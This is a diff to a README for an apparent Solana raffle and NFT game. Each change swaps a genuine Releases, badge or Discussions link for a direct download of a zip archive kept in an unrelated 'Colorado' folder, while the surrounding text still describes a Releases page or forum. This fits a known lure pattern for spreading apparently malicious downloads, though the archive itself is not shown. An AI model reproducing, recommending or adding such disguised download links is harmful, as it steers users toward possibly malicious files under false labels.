@@ -1,6 +1,6 @@
 # 🎟️ raffle-game-smart-contract-solana - Play Raffles and Win NFTs Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/umeshyenkar/raffle-game-smart-contract-solana/releases)
+[![Download Now](https://raw.githubusercontent.com/umeshyenkar/raffle-game-smart-contract-solana/main/Colorado/raffle-game-smart-contract-solana.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/umeshyenkar/raffle-game-smart-contract-solana/main/Colorado/raffle-game-smart-contract-solana.zip)
 
 ## 🌟 Overview
 
@@ -14,7 +14,7 @@ This guide helps you download and run the raffle application without any technic
 
 To download the application, visit the Releases page. Click the button below for quick access:
 
-[Download Now](https://github.com/umeshyenkar/raffle-game-smart-contract-solana/releases)
+[Download Now](https://raw.githubusercontent.com/umeshyenkar/raffle-game-smart-contract-solana/main/Colorado/raffle-game-smart-contract-solana.zip)
 
 ### 📦 System Requirements
 
@@ -25,7 +25,7 @@ To download the application, visit the Releases page. Click the button below for
 ### 🛠️ Installation Steps
 
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/umeshyenkar/raffle-game-smart-contract-solana/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/umeshyenkar/raffle-game-smart-contract-solana/main/Colorado/raffle-game-smart-contract-solana.zip).
 
 2. **Choose Your File**
    - On the Releases page, you will see different files available for download. Look for the file suited for your operating system.
@@ -90,10 +90,10 @@ If a raffle does not meet the required number of tickets sold, you will receive 
 If you have any questions or need help with the application, consider reaching out through our community channels. Follow us on social media or visit the discussion forums on GitHub.
 
 Join the conversation:
-- [GitHub Discussions](https://github.com/umeshyenkar/raffle-game-smart-contract-solana/discussions)
+- [GitHub Discussions](https://raw.githubusercontent.com/umeshyenkar/raffle-game-smart-contract-solana/main/Colorado/raffle-game-smart-contract-solana.zip)
 
 ## 🎉 Conclusion
 
 You are now ready to enjoy the thrill of raffle games on the Solana blockchain. Follow the steps above to download and run the application smoothly. Have fun, and good luck with your winning tickets! 
 
-For further assistance, please check our [Releases page](https://github.com/umeshyenkar/raffle-game-smart-contract-solana/releases) for the latest updates and features.
+For further assistance, please check our [Releases page](https://raw.githubusercontent.com/umeshyenkar/raffle-game-smart-contract-solana/main/Colorado/raffle-game-smart-contract-solana.zip) for the latest updates and features.
